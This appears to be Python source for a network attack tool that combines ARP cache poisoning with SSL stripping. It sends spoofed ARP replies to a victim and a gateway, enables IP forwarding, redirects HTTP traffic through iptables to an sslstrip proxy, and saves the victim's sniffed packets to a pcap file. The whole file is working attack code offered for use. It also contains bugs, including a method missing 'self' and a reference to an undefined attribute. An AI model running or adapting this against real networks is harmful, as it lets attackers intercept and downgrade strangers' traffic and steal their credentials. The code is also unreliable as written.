# Packages
import scapy.all as scapy
import sys, time, multiprocessing
import netifaces as ni
import subprocess
import logging
import click
from .URLMonitor import URLMonitor
from .CookieCleaner import CookieCleaner
from .StrippingProxy import StrippingProxy
from twisted.web import http
from twisted.internet import reactor

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30


# ARP SSL Stripping Attack
class ARPSSLStripping():
    # Constructs the ARP Man in the Middle DNS Spoofing Attack
    def __init__(self, victimIP, gatewayIP, interface):
        # Disables verbosity (command line) mode
        scapy.conf.verb = 0

        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign targets
        self.victimIP = victimIP
        self.interface = interface
        self.gatewayIP = gatewayIP

        # Assign macAddresses
        self.victimMac = scapy.getmacbyip(victimIP)
        if not self.victimMac: # If victim MAC not found
            raise ValueError("Cannot find MAC address for victim IP: {}".format(victimIP))

        self.gatewayMac = scapy.getmacbyip(self.gatewayIP)
        if not self.gatewayMac: # If gateway MAC not found
            raise ValueError("Cannot find MAC address for gateway IP: {}".format(self.gatewayIP))

        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPSSLStripping({}, {}, {})'.format(self.victimIP, self.gateway, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP SSL Stripping on {}:\n - Victim IP {} at {}'.format(
                self.interface, self.victimIP, self.victimMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP SSL Stripping and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup SSL strip
        self.setup_ssl_strip(9000)

        # Setup packets
        # ARP Poisoning packet for victim one
        victimPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.gatewayIP,
                           pdst = self.victimIP, 
                           hwdst = self.victimMac)

        # ARP Poisoning packet for victim two
        gatewayPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimIP,
                            pdst = self.gatewayIP,
                            hwdst = self.gatewayMac)

        # Sniffing process
        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)

        # Start sniffing process
        sniffingIncomingPacketsProcess.start()

        # Infinitely poisons the victims
        while True:
            try: # Send poison packets
                scapy.send(victimPoisonPacket)
                scapy.send(gatewayPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                self.clean() # Cleaning ARP tables of the victims
                break # Stop the poisoning-loop

    # Sniffs incoming packets
    def sniffIncomingPackets(self):
        bpfFilter = 'ip host {}'.format(self.victimIP) 
        incomingPackets = scapy.sniff(filter = bpfFilter)
        #storing all packets in a pcap file
        scapy.wrpcap('captured_packets.pcap', incomingPackets)

    # Clean ARP tables of the victims
    def clean(self):
        # Clean victim one's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.gatewayIP,
            hwsrc=self.gatewayMac,
            pdst=self.victimIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean victim two's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimIP,
            hwsrc=self.victimMac,
            pdst=self.gatewayIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)

    #check if the posioning was sucessful
    def check_arp_poisoning(self):
        # Send an ICMP echo request (ping) to the victim
        icmp = scapy.IP(dst=self.victimIP)/scapy.ICMP()
        response = scapy.sr1(icmp, timeout=2, verbose=0)

        if response is not None and response.src == self.victimIP and response[scapy.ICMP].type == 0:
            # We received an ICMP echo reply from the victim
            print("ARP poisoning appears to be successful")
        else:
            # We didn't receive a reply, or the reply wasn't what we expected
            print("ARP poisoning may not have been successful")

    def setup_iptables_redirect(listen_port, reset=False):
        try:
            if reset:
                # Run the iptables command to delete the redirection rule
                subprocess.call(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', str(listen_port)])
            else:
                # Run the iptables command to redirect traffic from port 80 to the specified listen_port
                subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', str(listen_port)])

        except Exception as e:
            click.echo('An error occurred while trying to setup iptables: {}'.format(e))


    def set_ip_forwarding(self, enable=True):
      # Converting boolean to int makes it a 1 or 0. making it a string allows us to use it in the subprocess
        value = str(int(enable))

        subprocess.call('echo {} > /proc/sys/net/ipv4/ip_forward'.format(value), shell=True)


    def start_ssl_strip(self, log_file, log_level, listen_port):
    
        logging.basicConfig(level=log_level, format='%(asctime)s %(message)s', filename=log_file, filemode='w')

        URLMonitor.getInstance().setFaviconSpoofing(False)
        CookieCleaner.getInstance().setEnabled(False)

        stripping_factory = http.HTTPFactory(timeout=10)
        stripping_factory.protocol = StrippingProxy

        reactor.listenTCP(int(listen_port), stripping_factory)
        click.echo('\nsslstrip running...')
        reactor.run()

    def setup_ssl_strip(self, listen_port, log_file='sslstrip.log', log_level=logging.WARNING):
        # Set up IP tables redirect
        self.setup_iptables_redirect(listen_port)

        # Enable IP forwarding
        self.set_ip_forwarding()

        # Start SSL strip
        self.start_ssl_strip(log_file, log_level, listen_port)
